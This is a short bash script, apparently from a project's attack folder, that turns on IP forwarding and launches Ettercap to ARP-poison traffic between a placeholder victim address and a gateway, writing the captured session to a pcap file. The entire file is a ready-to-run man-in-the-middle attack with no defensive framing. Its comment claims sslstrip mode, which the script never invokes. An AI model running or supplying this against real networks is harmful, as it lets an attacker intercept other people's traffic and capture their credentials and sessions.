#!/bin/bash
# src/attack/run_ettercap.sh
# Launch Ettercap in ARP-poison + sslstrip mode

set -e

echo "[*] Enabling IP forwarding..."
sudo sysctl -w net.inet.ip.forwarding=1

echo "[*] Starting Ettercap..."
sudo ettercap -T -M arp:remote /<victim IP>/ /<gateway IP>/ -w data/ettercap_session.pcap
